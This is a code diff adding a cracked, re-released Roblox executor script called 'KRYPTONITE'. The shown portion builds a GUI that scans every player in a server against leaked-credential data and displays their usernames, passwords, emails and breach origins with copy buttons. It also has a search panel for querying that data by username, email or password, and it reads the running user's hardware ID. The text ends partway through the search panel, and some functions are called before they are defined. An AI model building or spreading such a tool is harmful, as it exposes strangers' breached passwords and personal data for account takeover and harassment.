@@ -1,0 +1,1345 @@
+--[[
+      SPAISPACEHUB         
+      Overpriced Turkish CHATGPT garbage that deserves to be free           
+      ──────────────────────────────────────────────────    
+      Reason: Scamming $45 for AI slop + obsessed fanboys 
+
+      Enjoy for FREE! 😘                                   
+ 
+]]--
+
+--// SERVICES
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local StarterGui = game:GetService("StarterGui") 
+local MarketplaceService = game:GetService("MarketplaceService")
+
+--// GAME & USER INFO
+local LocalPlayer = Players.LocalPlayer
+local HWID = "Unknown"
+if gethwid then
+    HWID = gethwid()
+end
+
+local GameName = "Unknown"
+task.spawn(function()
+    pcall(function()
+        local info = MarketplaceService:GetProductInfo(game.PlaceId)
+        if info then GameName = info.Name end
+    end)
+end)
+
+if StarterGui:FindFirstChild("SetCore") then
+    pcall(function() StarterGui:SetCore("SendNotification", { Title = "KRYPTONITE (CRACKED)", Text = "Leaked by Stalkie - UI Loaded" }) end)
+end
+
+--// DATA
+local usersWithLogs = {}
+local previousLogs = {}
+local scanQueue = {}
+local scannedPlayers = {}
+local isScanning = false
+local isMinimized = false
+local isAutoScanEnabled = false
+local SCAN_DELAY = 0.1
+
+local totalScans = 0
+local scanRounds = 0
+
+-- Dragging vars
+local isDragging = false
+local dragStartPos = nil
+local miniFrame = nil
+
+--// THEME (GÜNCELLENMİŞ)
+local Theme = {
+    MainBG = Color3.fromRGB(18, 18, 28),
+    PanelBG = Color3.fromRGB(25, 25, 40),
+    Accent = Color3.fromRGB(0, 200, 255),
+    Red = Color3.fromRGB(255, 80, 100),
+    Green = Color3.fromRGB(0, 255, 180),
+    Text = Color3.fromRGB(235, 235, 255),
+    Outline = Color3.fromRGB(0, 140, 200),
+    Button = Color3.fromRGB(35, 35, 50),
+    Hover = Color3.fromRGB(50, 50, 70),
+    ScanGray = Color3.fromRGB(150, 150, 180),
+    TerminalBG = Color3.fromRGB(10, 10, 20),
+}
+
+-- Custom trim function for compatibility
+local function trim(s)
+    return s:match('^%s*(.*%S)') or ''
+end
+
+-- Helper function for smooth color transitions
+local function tweenColor(instance, color)
+    TweenService:Create(instance, TweenInfo.new(0.15), { BackgroundColor3 = color }):Play()
+end
+
+
+--// GUI BUILD
+local gui = Instance.new("ScreenGui")
+gui.Name = "KRYPTONITE_UI"
+gui.ResetOnSpawn = false
+gui.Parent = CoreGui
+
+-- Main frame
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Size = UDim2.new(0, 0, 0, 0)
+Main.Position = UDim2.new(0.5, 0, 0.5, 0)
+Main.AnchorPoint = Vector2.new(0.5, 0.5)
+Main.BackgroundColor3 = Theme.MainBG
+Main.BorderColor3 = Theme.Outline
+Main.BorderSizePixel = 1
+Main.Active = true
+Main.Parent = gui
+
+-- Custom Drag Logic for Main Frame (Basitleştirildi)
+local function startDrag()
+    isDragging = true
+    dragStartPos = UserInputService:GetMouseLocation()
+end
+local function endDrag()
+    isDragging = false
+end
+
+Main.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        startDrag()
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        endDrag()
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement and isDragging and not isMinimized then
+        local mousePos = UserInputService:GetMouseLocation()
+        local delta = mousePos - dragStartPos
+        Main.Position = Main.Position + UDim2.new(0, delta.X, 0, delta.Y)
+        dragStartPos = mousePos
+    end
+end)
+
+
+local mainCorner = Instance.new("UICorner", Main)
+mainCorner.CornerRadius = UDim.new(0, 12)
+
+-- Animate open (GÜNCELLENMİŞ - Elastic)
+task.delay(0.1, function()
+    local goal = { Size = UDim2.new(0, 720, 0, 460), BorderColor3 = Theme.Accent }
+    local tween = TweenService:Create(Main, TweenInfo.new(0.7, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), goal)
+    tween:Play()
+end)
+
+-- Header
+local Header = Instance.new("TextLabel", Main)
+Header.Size = UDim2.new(1, 0, 0, 40)
+Header.Position = UDim2.new(0, 0, 0, 0)
+Header.Text = "KRYPTONITE"
+Header.TextColor3 = Theme.Accent
+Header.BackgroundTransparency = 1
+Header.Font = Enum.Font.SciFi
+Header.TextSize = 30 -- Slightly larger
+
+local SubHeader = Instance.new("TextLabel", Main)
+SubHeader.Size = UDim2.new(0, 200, 0, 20)
+SubHeader.Position = UDim2.new(0.5, 75, 0, 22)
+SubHeader.Text = "cracked by stalkie"
+SubHeader.TextColor3 = Theme.Red
+SubHeader.BackgroundTransparency = 1
+SubHeader.Font = Enum.Font.Michroma
+SubHeader.TextSize = 12
+SubHeader.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Close / Minimize button (GÜNCELLENMİŞ)
+local CloseBtn = Instance.new("TextButton", Main)
+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(1, -40, 0, 5)
+CloseBtn.Text = "✖"
+CloseBtn.TextColor3 = Color3.new(1,1,1)
+CloseBtn.BackgroundColor3 = Theme.Red
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.TextSize = 18
+local closeCorner = Instance.new("UICorner", CloseBtn)
+closeCorner.CornerRadius = UDim.new(0,8)
+CloseBtn.AutoButtonColor = false
+CloseBtn.MouseEnter:Connect(function() tweenColor(CloseBtn, Theme.Hover) end)
+CloseBtn.MouseLeave:Connect(function() tweenColor(CloseBtn, Theme.Red) end)
+
+-- Status label
+local StatusLabel = Instance.new("TextLabel", Main)
+StatusLabel.Name = "StatusLabel"
+StatusLabel.Size = UDim2.new(1, -20, 0, 20)
+StatusLabel.Position = UDim2.new(0, 10, 1, -25)
+StatusLabel.Text = ""
+StatusLabel.TextColor3 = Theme.Text
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Font = Enum.Font.GothamBold
+StatusLabel.TextSize = 13
+StatusLabel.Visible = false
+StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Search Button (GÜNCELLENMİŞ Esthetics)
+local SearchTabButton = Instance.new("TextButton", Main)
+SearchTabButton.Size = UDim2.new(0, 100, 0, 28)
+SearchTabButton.Position = UDim2.new(0, 10, 0, 5)
+SearchTabButton.Text = "SEARCH"
+SearchTabButton.TextColor3 = Theme.Text
+SearchTabButton.BackgroundColor3 = Theme.Button
+SearchTabButton.Font = Enum.Font.GothamBold
+SearchTabButton.TextSize = 14
+SearchTabButton.AutoButtonColor = false
+local searchCorner = Instance.new("UICorner", SearchTabButton)
+searchCorner.CornerRadius = UDim.new(0, 8)
+local searchStroke = Instance.new("UIStroke", SearchTabButton)
+searchStroke.Color = Theme.Outline
+searchStroke.Thickness = 1
+searchStroke.Transparency = 0.5
+SearchTabButton.MouseEnter:Connect(function() tweenColor(SearchTabButton, Theme.Hover) end)
+SearchTabButton.MouseLeave:Connect(function() tweenColor(SearchTabButton, Theme.Button) end)
+
+
+-- 🌟 Auto Scan Toggle Button (GÜNCELLENMİŞ)
+local AutoScanButton = Instance.new("TextButton", Main)
+AutoScanButton.Size = UDim2.new(0, 100, 0, 28)
+AutoScanButton.Position = UDim2.new(0, 115, 0, 5)
+AutoScanButton.TextColor3 = Theme.Text
+AutoScanButton.Font = Enum.Font.GothamBold
+AutoScanButton.TextSize = 14
+AutoScanButton.AutoButtonColor = false
+local autoScanCorner = Instance.new("UICorner", AutoScanButton)
+autoScanCorner.CornerRadius = UDim.new(0, 8)
+local autoScanStroke = Instance.new("UIStroke", AutoScanButton)
+autoScanStroke.Thickness = 1
+autoScanStroke.Transparency = 0.5
+
+-- Buton rengini ve metnini güncelleyen yardımcı fonksiyon (Tweenli)
+local function updateAutoScanButton(isEnabled)
+    local bgColor = isEnabled and Theme.Green or Theme.Red
+    local strokeColor = isEnabled and Color3.fromRGB(0, 100, 0) or Color3.fromRGB(100, 0, 0)
+    local text = isEnabled and "SCAN: ON" or "SCAN: OFF"
+    
+    TweenService:Create(AutoScanButton, TweenInfo.new(0.2), { BackgroundColor3 = bgColor }):Play()
+    AutoScanButton.Text = text
+    autoScanStroke.Color = strokeColor
+end
+updateAutoScanButton(isAutoScanEnabled)
+
+AutoScanButton.MouseEnter:Connect(function() tweenColor(AutoScanButton, Theme.Hover) end)
+AutoScanButton.MouseLeave:Connect(function() updateAutoScanButton(isAutoScanEnabled) end)
+
+AutoScanButton.MouseButton1Click:Connect(function()
+    isAutoScanEnabled = not isAutoScanEnabled
+    updateAutoScanButton(isAutoScanEnabled)
+    if isAutoScanEnabled then
+        terminalLog("Auto Scan enabled. Starting queue processing...", "info")
+        for _, plr in ipairs(Players:GetPlayers()) do
+            queueUser(plr.Name, plr)
+        end
+        processQueue() 
+    else
+        terminalLog("Auto Scan disabled. Scanner paused.", "warn")
+        scanQueue = {} 
+    end
+end)
+
+
+-- Left Panel — Leaked users (BOŞLUK DÜZELTİLDİ VE DISCORD EKLENDİ)
+local HEADER_BUTTON_HEIGHT = SearchTabButton.Size.Y.Offset -- 28
+local HEADER_PADDING_Y = SearchTabButton.Position.Y.Offset -- 5
+local LEFT_PANEL_Y_START = HEADER_BUTTON_HEIGHT + (HEADER_PADDING_Y * 2) -- 28 + 10 = 38 (Boşluk yok)
+local LeftPanelOffset = 0 -- Header Yüksekliği
+local LeftPanel = Instance.new("Frame", Main)
+-- Main Y - Header Y (40) - Left Panel'in üstten başlayan Y'si
+LeftPanel.Size = UDim2.new(0, 220, 1, -(LeftPanelOffset + LEFT_PANEL_Y_START - HEADER_PADDING_Y + 20)) -- 20 discord yazısı için ek boşluk
+LeftPanel.Position = UDim2.new(0, 10, 0, LEFT_PANEL_Y_START) -- 38 Y'den başlar
+LeftPanel.BackgroundColor3 = Theme.PanelBG
+LeftPanel.BorderColor3 = Theme.Outline
+LeftPanel.BorderSizePixel = 1
+local leftCorner = Instance.new("UICorner", LeftPanel)
+leftCorner.CornerRadius = UDim.new(0,10)
+
+local LeftTitle = Instance.new("TextLabel", LeftPanel)
+LeftTitle.Size = UDim2.new(1, 0, 0, 26)
+LeftTitle.Text = "Leaked Users"
+LeftTitle.TextColor3 = Theme.Red
+LeftTitle.BackgroundTransparency = 1
+LeftTitle.Font = Enum.Font.GothamBold
+LeftTitle.TextSize = 14
+
+local ScanProgressLabel = Instance.new("TextLabel", LeftPanel)
+ScanProgressLabel.Size = UDim2.new(1, 0, 0, 20)
+ScanProgressLabel.Position = UDim2.new(0, 0, 0, 26)
+ScanProgressLabel.BackgroundTransparency = 1
+ScanProgressLabel.TextColor3 = Theme.Text
+ScanProgressLabel.Font = Enum.Font.Gotham
+ScanProgressLabel.TextSize = 13
+ScanProgressLabel.Text = "Checked: 0/0 x0"
+ScanProgressLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local LeftScroll = Instance.new("ScrollingFrame", LeftPanel)
+LeftScroll.Position = UDim2.new(0, 0, 0, 46)
+LeftScroll.Size = UDim2.new(1, 0, 1, -46 - 20) -- Discord yazısı için alttan boşluk
+LeftScroll.BackgroundTransparency = 1
+LeftScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+LeftScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+LeftScroll.ScrollBarThickness = 6
+local LeftLayout = Instance.new("UIListLayout", LeftScroll)
+LeftLayout.Padding = UDim.new(0, 4)
+
+-- Discord Link Label (Yeni Eklendi)
+local DiscordLabel = Instance.new("TextLabel", LeftPanel)
+DiscordLabel.Size = UDim2.new(1, -10, 0, 20)
+DiscordLabel.Position = UDim2.new(0, 5, 1, -20) -- En alta hizalı
+DiscordLabel.Text = "discord.gg/stalkie"
+DiscordLabel.TextColor3 = Theme.Accent
+DiscordLabel.BackgroundTransparency = 1
+DiscordLabel.Font = Enum.Font.Gotham
+DiscordLabel.TextSize = 14
+DiscordLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+
+-- Right panel / Terminal (GÜNCELLENMİŞ)
+local RightPanel = Instance.new("Frame", Main)
+RightPanel.Size = UDim2.new(0, 470, 1, -50)
+RightPanel.Position = UDim2.new(0, 240, 0, 40)
+RightPanel.BackgroundColor3 = Theme.PanelBG
+RightPanel.BorderColor3 = Theme.Outline
+RightPanel.BorderSizePixel = 1
+local rightCorner = Instance.new("UICorner", RightPanel)
+rightCorner.CornerRadius = UDim.new(0,10)
+
+local Terminal = Instance.new("ScrollingFrame", RightPanel)
+Terminal.Name = "Terminal"
+Terminal.Size = UDim2.new(1, -10, 1, -40)
+Terminal.Position = UDim2.new(0, 5, 0, 35)
+Terminal.BackgroundColor3 = Theme.TerminalBG
+Terminal.BackgroundTransparency = 0.05
+Terminal.BorderSizePixel = 0
+Terminal.CanvasSize = UDim2.new(0, 0, 0, 0)
+Terminal.AutomaticCanvasSize = Enum.AutomaticSize.Y
+Terminal.ScrollBarThickness = 6
+
+local TermLayout = Instance.new("UIListLayout", Terminal)
+TermLayout.Padding = UDim.new(0, 1)
+
+local ReturnButton = Instance.new("TextButton", RightPanel)
+ReturnButton.Size = UDim2.new(0, 100, 0, 28)
+ReturnButton.Position = UDim2.new(1, -105, 0, 5)
+ReturnButton.Text = "↩ RETURN"
+ReturnButton.TextColor3 = Theme.Text
+ReturnButton.BackgroundColor3 = Theme.Button
+ReturnButton.Font = Enum.Font.GothamBold
+ReturnButton.TextSize = 14
+ReturnButton.AutoButtonColor = false
+local returnCorner = Instance.new("UICorner", ReturnButton)
+returnCorner.CornerRadius = UDim.new(0,8)
+ReturnButton.MouseEnter:Connect(function() tweenColor(ReturnButton, Theme.Hover) end)
+ReturnButton.MouseLeave:Connect(function() tweenColor(ReturnButton, Theme.Button) end)
+
+-- Info Button (GÜNCELLENMİŞ Esthetics)
+local InfoButton = Instance.new("TextButton", Main)
+InfoButton.Size = UDim2.new(0, 100, 0, 28)
+InfoButton.Position = UDim2.new(1, -140, 0, 5)
+InfoButton.Text = "INFO"
+InfoButton.TextColor3 = Theme.Text
+InfoButton.BackgroundColor3 = Theme.Button
+InfoButton.Font = Enum.Font.Gotham
+InfoButton.TextSize = 14
+InfoButton.AutoButtonColor = false
+local infoCorner = Instance.new("UICorner", InfoButton)
+infoCorner.CornerRadius = UDim.new(0, 8)
+
+-- Subtle stroke for border (Blue outline for INFO button)
+local infoStroke = Instance.new("UIStroke", InfoButton)
+infoStroke.Color = Theme.Outline
+infoStroke.Thickness = 1
+infoStroke.Transparency = 0.5
+
+InfoButton.MouseEnter:Connect(function()
+    tweenColor(InfoButton, Theme.Hover)
+    TweenService:Create(infoStroke, TweenInfo.new(0.15), { Transparency = 0.2 }):Play()
+end)
+InfoButton.MouseLeave:Connect(function()
+    tweenColor(InfoButton, Theme.Button)
+    TweenService:Create(infoStroke, TweenInfo.new(0.15), { Transparency = 0.5 }):Play()
+end)
+
+--// LOGGING
+local function terminalLog(msg, logType)
+    table.insert(previousLogs, msg)
+
+    local prefix = "[LOG]"
+    local color = Theme.Text
+
+    if logType == "info" then
+        prefix = "[INFO]"
+        color = Theme.Green
+    elseif logType == "warn" then
+        prefix = "[WARN]"
+        color = Color3.fromRGB(255, 200, 0)
+    elseif logType == "error" then
+        prefix = "[ERROR]"
+        color = Theme.Red
+    elseif logType == "scan" then
+        prefix = "[SCAN]"
+        color = Theme.ScanGray
+    elseif logType == "leak" then
+        prefix = "[LEAKED]"
+        color = Color3.fromRGB(255,80,80)
+    end
+
+    local lbl = Instance.new("TextLabel", Terminal)
+    lbl.Size = UDim2.new(1, -10, 0, 20)
+    lbl.Text = prefix .. " " .. msg
+    lbl.TextColor3 = color
+    lbl.BackgroundTransparency = 1
+    lbl.Font = Enum.Font.Code
+    lbl.TextSize = 14
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    -- Scroll to bottom
+    task.defer(function()
+        Terminal.CanvasPosition = Vector2.new(0, Terminal.CanvasSize.Y.Offset)
+    end)
+end
+
+-- Function to clear all tabs (UserInfo, Info, Search)
+local function clearRightPanelTabs()
+    local old = RightPanel:FindFirstChild("UserTab")
+    if old then old:Destroy() end
+    local old2 = RightPanel:FindFirstChild("InfoTab")
+    if old2 then old2:Destroy() end
+    local old3 = RightPanel:FindFirstChild("SearchTab")
+    if old3 then old3:Destroy() end
+    
+    local oldUserTitle = RightPanel:FindFirstChild("UserTabTitle")
+    if oldUserTitle then oldUserTitle:Destroy() end
+
+    local oldSearchHeaderFrame = RightPanel:FindFirstChild("SearchHeaderFrame")
+    if oldSearchHeaderFrame then oldSearchHeaderFrame:Destroy() end
+end
+
+-- Go back to main terminal
+local function returnToTerminal()
+    clearRightPanelTabs() 
+    Terminal.Visible = true
+    ReturnButton.Visible = false
+end
+ReturnButton.MouseButton1Click:Connect(returnToTerminal)
+
+-- Open user info tab (ENGLISH TRANSLATION)
+local function openUserInfoTab(username)
+    Terminal.Visible = false
+    ReturnButton.Visible = true
+    clearRightPanelTabs()
+
+    local entries = usersWithLogs[username:lower()] or {}
+    
+    local UserTabTitle = Instance.new("TextLabel", RightPanel)
+    UserTabTitle.Name = "UserTabTitle"
+    UserTabTitle.Size = UDim2.new(1, -10, 0, 24)
+    UserTabTitle.Position = UDim2.new(0, 5, 0, 5) 
+    UserTabTitle.Text = "DETAILED LOG RECORDS: " .. username 
+    UserTabTitle.TextColor3 = Theme.Accent
+    UserTabTitle.BackgroundTransparency = 1
+    UserTabTitle.Font = Enum.Font.GothamBold
+    UserTabTitle.TextSize = 16
+    UserTabTitle.TextXAlignment = Enum.TextXAlignment.Left
+    
+    local USER_HEADER_HEIGHT = UserTabTitle.Size.Y.Offset + 5 
+    local USER_CONTENT_START_Y = 5 + USER_HEADER_HEIGHT 
+    
+    local UserTab = Instance.new("ScrollingFrame", RightPanel)
+    UserTab.Name = "UserTab"
+    UserTab.Size = UDim2.new(1, -10, 1, -(35 + USER_HEADER_HEIGHT))
+    UserTab.Position = UDim2.new(0, 5, 0, USER_CONTENT_START_Y) 
+    UserTab.BackgroundTransparency = 1
+    UserTab.BorderSizePixel = 0
+    UserTab.CanvasSize = UDim2.new(0, 0, 0, 0)
+    UserTab.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    UserTab.ScrollBarThickness = 6
+    local lay = Instance.new("UIListLayout", UserTab)
+    lay.Padding = UDim.new(0, 5)
+
+    -- 💡 YALNIZCA SAĞDA KOPYALA BUTONU OLAN makeInfoLineWithCopy
+    local function makeInfoLineWithCopy(label, value, valueColor)
+        local frame = Instance.new("Frame", UserTab)
+        frame.Size = UDim2.new(1, -10, 0, 22)
+        frame.BackgroundTransparency = 1
+        
+        if not value or value == "N/A" or value:len() == 0 then
+            local textLabel = Instance.new("TextLabel", frame)
+            textLabel.Size = UDim2.new(1, 0, 1, 0) 
+            textLabel.Position = UDim2.new(0, 5, 0, 0)
+            textLabel.Text = label .. ": " .. (value or "N/A")
+            textLabel.TextColor3 = valueColor or Theme.Text
+            textLabel.BackgroundTransparency = 1
+            textLabel.Font = Enum.Font.Gotham
+            textLabel.TextSize = 14
+            textLabel.TextXAlignment = Enum.TextXAlignment.Left
+            textLabel.TextYAlignment = Enum.TextYAlignment.Center
+            return
+        end
+
+        local fullText = label .. ": " .. value
+        local textLabel = Instance.new("TextLabel", frame)
+        textLabel.Size = UDim2.new(1, -30, 1, 0) 
+        textLabel.Position = UDim2.new(0, 5, 0, 0) 
+        textLabel.Text = fullText
+        textLabel.TextColor3 = valueColor or Theme.Text
+        textLabel.BackgroundTransparency = 1
+        textLabel.Font = Enum.Font.Gotham
+        textLabel.TextSize = 14
+        textLabel.TextXAlignment = Enum.TextXAlignment.Left
+        textLabel.TextYAlignment = Enum.TextYAlignment.Center
+            
+        local copyBtn = Instance.new("TextButton", frame)
+        copyBtn.Size = UDim2.new(0, 25, 1, 0) 
+        copyBtn.Position = UDim2.new(1, -25, 0, 0) 
+        copyBtn.Text = "📋" 
+        copyBtn.TextColor3 = Theme.Green 
+        copyBtn.BackgroundTransparency = 1 
+        copyBtn.Font = Enum.Font.GothamBold
+        copyBtn.TextSize = 18
+        copyBtn.AutoButtonColor = false
+
+        copyBtn.MouseButton1Click:Connect(function()
+            if setclipboard then
+                setclipboard(value)
+                terminalLog("Copied: " .. label .. " (" .. value .. ")", "info")
+            else
+                terminalLog("Clipboard function unavailable.", "error")
+            end
+        end)
+    end
+
+    local function makeDivider()
+        local line = Instance.new("Frame", UserTab)
+        line.Size = UDim2.new(1, -10, 0, 1)
+        line.Position = UDim2.new(0, 5, 0, 0)
+        line.BackgroundColor3 = Theme.ScanGray
+        line.BackgroundTransparency = 0.7
+        local spacer = Instance.new("Frame", UserTab)
+        spacer.Size = UDim2.new(1, 0, 0, 5)
+        spacer.BackgroundTransparency = 1
+    end
+
+    for _, entry in ipairs(entries) do
+        local originStr = table.concat(entry.origin or {}, ", ")
+        if originStr == "" and entry.source and entry.source.name then
+            originStr = entry.source.name
+        end
+        
+        makeInfoLineWithCopy("Username", entry.username or "N/A", Theme.Text)
+        makeInfoLineWithCopy("Password", entry.password or "N/A", Theme.Red)
+        makeInfoLineWithCopy("Email", entry.email or "N/A", Theme.Green)
+        makeInfoLineWithCopy("Origin", originStr or "N/A", Theme.Accent)
+        makeDivider()
+    end
+end
+-- Info tab (GÜNCELLENMİŞ VE GÜZELLEŞTİRİLMİŞ)
+local function openInfoTab()
+    Terminal.Visible = false
+    ReturnButton.Visible = true
+    clearRightPanelTabs()
+
+    local InfoTab = Instance.new("ScrollingFrame", RightPanel)
+    InfoTab.Name = "InfoTab"
+    InfoTab.Size = UDim2.new(1, -10, 1, -40)
+    InfoTab.Position = UDim2.new(0, 5, 0, 35)
+    InfoTab.BackgroundTransparency = 1
+    InfoTab.BorderSizePixel = 0
+    InfoTab.CanvasSize = UDim2.new(0, 0, 0, 0)
+    InfoTab.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    InfoTab.ScrollBarThickness = 6
+    local layout = Instance.new("UIListLayout", InfoTab)
+    layout.Padding = UDim.new(0, 8) -- Daha fazla boşluk
+
+    local function makeTitle(text)
+        local lbl = Instance.new("TextLabel", InfoTab)
+        lbl.Size = UDim2.new(1, -10, 0, 25)
+        lbl.Text = text
+        lbl.TextColor3 = Theme.Accent
+        lbl.BackgroundTransparency = 1
+        lbl.Font = Enum.Font.SciFi -- Daha dikkat çekici başlık fontu
+        lbl.TextSize = 18
+        lbl.TextXAlignment = Enum.TextXAlignment.Left
+        Instance.new("UIListLayout", lbl):Destroy() -- list item olarak eklendiği için layout bozulmasın
+    end
+
+    local function makeLine(text, color)
+        local lbl = Instance.new("TextLabel", InfoTab)
+        lbl.Size = UDim2.new(1, -10, 0, 18)
+        lbl.Text = text
+        lbl.TextColor3 = color or Theme.Text
+        lbl.BackgroundTransparency = 1
+        lbl.Font = Enum.Font.Gotham
+        lbl.TextSize = 14
+        lbl.TextWrapped = true
+        lbl.TextXAlignment = Enum.TextXAlignment.Left
+    end
+    
+    makeTitle("KRYPTONITE SERVICE OVERVIEW")
+    makeLine("Leaked and Cracked by Stalkie", Theme.Red)
+    makeLine("Discord: discord.gg/stalkie", Theme.Accent)
+    makeLine("Enjoy this poorly coded AI slop script for free. Btw this shit costs $45 so enjoy 😘", Theme.Green)
+    
+    makeTitle("SCANNING MODULE")
+    makeLine("• Live User Scanning provides real-time leak checks for players joining the server.", Theme.Text)
+    makeLine("• Auto Scan (SCAN: ON) enables continuous checking and rescan attempts.", Theme.Text)
+    makeLine("• Results may not be 100% accurate, but data with 'roblox' origin is verified and guaranteed real.", Color3.fromRGB(255, 200, 0))
+
+    makeTitle("SEARCH & DEEPER INFORMATION")
+    makeLine("Search Tab is for getting more information about them; searching more and more will lead you to deeper informations.", Theme.Accent)
+    makeLine("You can manually query the database using usernames, emails, or passwords.", Theme.Text)
+    
+    makeTitle("COPYRIGHT & SUPPORT")
+    makeLine("© 2024 Kryptonite Team (lol no). Leaked by Stalkie.", Theme.ScanGray)
+end
+InfoButton.MouseButton1Click:Connect(openInfoTab)
+
+-- New: Open Search Tab UI (DUAL FIELDS & PASSWORD FIXED)
+local searchRunning = false
+local EmailBoxInput = nil 
+local PasswordBoxInput = nil 
+
+local function openSearchPanel()
+    Terminal.Visible = false
+    ReturnButton.Visible = true
+    clearRightPanelTabs()
+
+    local SearchHeaderFrame = Instance.new("Frame", RightPanel)
+    SearchHeaderFrame.Name = "SearchHeaderFrame"
+    SearchHeaderFrame.Size = UDim2.new(1, -10, 0, 0) 
+    SearchHeaderFrame.Position = UDim2.new(0, 5, 0, 35) 
+    SearchHeaderFrame.BackgroundTransparency = 1
+    
+    local HeaderLayout = Instance.new("UIListLayout", SearchHeaderFrame)
+    HeaderLayout.Padding = UDim.new(0, 2) 
+    HeaderLayout.FillDirection = Enum.FillDirection.Vertical
+    HeaderLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+
+    local title = Instance.new("TextLabel", SearchHeaderFrame)
+    title.Name = "SearchTitle"
+    title.Size = UDim2.new(1, 0, 0, 20) 
+    title.Text = "EXTERNAL SEARCH MODULE"
+    title.TextColor3 = Theme.Accent
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 16
+    title.TextXAlignment = Enum.TextXAlignment.Left
+
+    local function makeStaticLogLine(txt, color)
+        local lbl = Instance.new("TextLabel")
+        lbl.Name = "StaticLogLine"
+        lbl.Size = UDim2.new(1, 0, 0, 18) 
+        lbl.Text = txt
+        lbl.TextColor3 = color or Theme.Text
+        lbl.BackgroundTransparency = 1
+        lbl.Font = Enum.Font.Code
+        lbl.TextSize = 14
+        lbl.TextXAlignment = Enum.TextXAlignment.Left
+        lbl.Parent = SearchHeaderFrame
+        return lbl
+    end
+
+    makeStaticLogLine("[INFO] Enter search term below. Use only one field.", Theme.Green)
+    
+    -- Email / Username Input
+    local EmailInputFrame = Instance.new("Frame", SearchHeaderFrame)
+    EmailInputFrame.Name = "EmailInputFrame"
+    EmailInputFrame.Size = UDim2.new(1, 0, 0, 26) 
+    EmailInputFrame.BackgroundTransparency = 1
+    local EmailInputLayout = Instance.new("UIListLayout", EmailInputFrame)
+    EmailInputLayout.FillDirection = Enum.FillDirection.Horizontal
+    EmailInputLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+    EmailInputLayout.Padding = UDim.new(0, 5)
+
+    local EmailLabel = Instance.new("TextLabel", EmailInputFrame)
+    EmailLabel.Size = UDim2.new(0, 80, 1, 0)
+    EmailLabel.Text = "Email/User:"
+    EmailLabel.TextColor3 = Theme.Text
+    EmailLabel.BackgroundTransparency = 1
+    EmailLabel.Font = Enum.Font.Gotham
+    EmailLabel.TextSize = 14
+
+    local EmailBox = Instance.new("TextBox", EmailInputFrame)
+    EmailBox.Name = "EmailBox"
+    EmailBox.Size = UDim2.new(1, -135, 1, 0)
+    EmailBox.PlaceholderText = "Email or Username..."
+    EmailBox.PlaceholderColor3 = Theme.ScanGray
+    EmailBox.BackgroundColor3 = Theme.Button
+    EmailBox.TextColor3 = Theme.Text
+    EmailBox.Font = Enum.Font.Gotham
+    EmailBox.TextSize = 14
+    EmailBox.TextXAlignment = Enum.TextXAlignment.Left
+    EmailBox.Text = ""
+    Instance.new("UICorner", EmailBox).CornerRadius = UDim.new(0, 5)
+    EmailBoxInput = EmailBox
+
+    -- Password Input
+    local PassInputFrame = Instance.new("Frame", SearchHeaderFrame)
+    PassInputFrame.Name = "PassInputFrame"
+    PassInputFrame.Size = UDim2.new(1, 0, 0, 26) 
+    PassInputFrame.BackgroundTransparency = 1
+    local PassInputLayout = Instance.new("UIListLayout", PassInputFrame)
+    PassInputLayout.FillDirection = Enum.FillDirection.Horizontal
+    PassInputLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+    PassInputLayout.Padding = UDim.new(0, 5)
+
+    local PassLabel = Instance.new("TextLabel", PassInputFrame)
+    PassLabel.Size = UDim2.new(0, 80, 1, 0)
+    PassLabel.Text = "Password:"
+    PassLabel.TextColor3 = Theme.Text
+    PassLabel.BackgroundTransparency = 1
+    PassLabel.Font = Enum.Font.Gotham
+    PassLabel.TextSize = 14
+
+    local PasswordBox = Instance.new("TextBox", PassInputFrame)
+    PasswordBox.Name = "PasswordBox"
+    PasswordBox.Size = UDim2.new(1, -135, 1, 0)
+    PasswordBox.PlaceholderText = "Enter password to search..."
+    PasswordBox.PlaceholderColor3 = Theme.ScanGray
+    PasswordBox.BackgroundColor3 = Theme.Button
+    PasswordBox.TextColor3 = Theme.Text
+    PasswordBox.Font = Enum.Font.Gotham
+    PasswordBox.TextSize = 14
+    PasswordBox.TextXAlignment = Enum.TextXAlignment.Left
+    PasswordBox.Text = ""
+    Instance.new("UICorner", PasswordBox).CornerRadius = UDim.new(0, 5)
+    PasswordBoxInput = PasswordBox
+
+    -- Run Button
+    local RunButtonFrame = Instance.new("Frame", SearchHeaderFrame)
+    RunButtonFrame.Name = "RunButtonFrame"
+    RunButtonFrame.Size = UDim2.new(1, 0, 0, 26) 
+    RunButtonFrame.BackgroundTransparency = 1
+
+    local SearchRunButton = Instance.new("TextButton", RunButtonFrame)
+    SearchRunButton.Name = "SearchRunButton"
+    SearchRunButton.Size = UDim2.new(0, 100, 1, 0)
+    SearchRunButton.Position = UDim2.new(0.5, -50, 0, 0)
+    SearchRunButton.Text = "RUN SEARCH"
+    SearchRunButton.TextColor3 = Theme.Text
+    SearchRunButton.BackgroundColor3 = Theme.Accent
+    SearchRunButton.Font = Enum.Font.GothamBold
+    SearchRunButton.TextSize = 14
+    Instance.new("UICorner", SearchRunButton).CornerRadius = UDim.new(0, 5)
+    SearchRunButton.AutoButtonColor = false
